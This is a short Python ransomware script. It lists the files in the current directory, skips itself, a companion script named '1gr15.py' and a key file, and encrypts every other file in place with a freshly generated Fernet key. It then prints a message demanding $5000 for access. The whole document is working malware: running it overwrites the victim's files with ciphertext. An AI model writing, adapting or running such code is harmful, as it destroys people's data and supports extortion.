import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "Sungj1nw00.py" or file == "thekey.key" or file == "1gr15.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
        thekey.write(key)


for file in files:
        with open(file,"rb") as thefile:
                contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)


print("The Files are encrypted and they belong to my liege.\n ")
print("pay up $5000 and give my liege's command line to access your files.\n if you want it that is")